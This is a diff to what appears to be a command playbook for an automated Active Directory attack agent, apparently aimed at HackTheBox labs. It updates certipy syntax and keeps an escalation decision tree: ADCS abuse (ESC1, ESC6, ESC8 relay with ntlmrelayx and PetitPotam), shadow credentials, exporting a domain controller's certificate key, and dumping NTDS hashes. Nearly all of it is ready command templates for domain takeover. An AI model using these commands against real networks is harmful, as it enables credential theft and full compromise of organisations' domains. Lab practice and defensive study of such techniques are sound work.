@@ -115,11 +115,13 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
   bhcli stats                                                                  # domain stats / edge counts
 
 [CERTIFICATE ATTACKS (ADCS)]
-  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable    # find vuln templates
-  certipy find -u <user>@<domain> -H <hash> -dc-ip <dc> -vulnerable    # PTH
-  certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -ca <ca-name> -template <template>   # ESC1/ESC3
-  certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -target <victim>          # shadow creds (GenericWrite)
-  certipy auth -pfx <cert.pfx> -dc-ip <dc>                             # auth with cert → get hash
+  ⚠️  ALWAYS add -dc-host <fqdn-of-DC> to every certipy command — Kerberos auth fails DNS
+      resolution for machine accounts without it (e.g. -dc-host DC01.logging.htb)
+  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -vulnerable
+  certipy find -u <user>@<domain> -H <hash> -dc-ip <dc> -dc-host <dc-fqdn> -vulnerable
+  certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -ca <ca-name> -template <template>
+  certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -target <victim>
+  certipy auth -pfx <cert.pfx> -dc-ip <dc> -dc-host <dc-fqdn>
 
 [AD ACL / ATTRIBUTE MANIPULATION]
   bloodyAD -d <domain> -u <user> -p <pass> --host <dc> get writable                         # find writable attrs
@@ -229,16 +231,16 @@ CRITICAL ATTACK PATTERNS
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ADCS ESCALATION DECISION TREE:
-  Step 1. certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable
+  Step 1. certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -vulnerable
   Step 2. Check what templates you can ENROLL in (look for "Enrollment Rights")
 
   ESC1 (template has "Enrollee Supplies Subject" + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT):
-    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -ca <ca> -template <tmpl> -upn administrator@domain
-    certipy auth -pfx administrator.pfx -dc-ip <dc>
+    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -ca <ca> -template <tmpl> -upn administrator@domain
+    certipy auth -pfx administrator.pfx -dc-ip <dc> -dc-host <dc-fqdn>
 
   ESC6 (CA has EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x40000):
     Same as ESC1 but applies to ALL templates (even those without enrollee supplies subject)
-    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -ca <ca> -template User -upn administrator@domain
+    certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -ca <ca> -template User -upn administrator@domain
     ⚠ IF UPN IN CERT ≠ requested UPN: CA may have been patched (May 2022 patch) → try ESC6 differently:
       Try with -dns flag instead: certipy req ... -dns dc01.domain.local
       OR try ESC6 with Machine template if you have machine account
@@ -247,18 +249,18 @@ ADCS ESCALATION DECISION TREE:
   ESC8 (NTLM relay to AD CS HTTP endpoint):
     ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
     petitpotam.py <attacker-ip> <dc-ip>
-    → get DC01$.pfx → certipy auth -pfx dc01.pfx -dc-ip <dc>
+    → get DC01$.pfx → certipy auth -pfx dc01.pfx -dc-ip <dc> -dc-host <dc-fqdn>
 
   Shadow Credentials (GenericWrite on user/computer):
-    certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -target <victim>
-    certipy auth -pfx <victim>.pfx -dc-ip <dc>
+    certipy shadow auto -u <attacker>@<domain> -p <pass> -dc-ip <dc> -dc-host <dc-fqdn> -target <victim>
+    certipy auth -pfx <victim>.pfx -dc-ip <dc> -dc-host <dc-fqdn>
 
   PKINIT as DC01$ (if you can access DC's KDC cert private key):
     # Find cert thumbprints: certutil -store My (in DC WinRM session)
     # Find key files: ls "C:/ProgramData/Microsoft/Crypto/RSA/MachineKeys/"
     # Each .pfx cert has a matching key file — use cert serial to find it
     # Export key: certutil -exportpfx -p "" My <thumbprint> dc01.pfx
-    certipy auth -pfx dc01.pfx -dc-ip <dc>   → get DC01$'s TGT
+    certipy auth -pfx dc01.pfx -dc-ip <dc> -dc-host <dc-fqdn>  → get DC01$'s TGT
     KRB5CCNAME=dc01.ccache nxc smb <dc> -u 'DC01$' --use-kcache -d <domain> --ntds
 
 DCSync via relay (GenericWrite/WriteDacl → no RBCD needed):
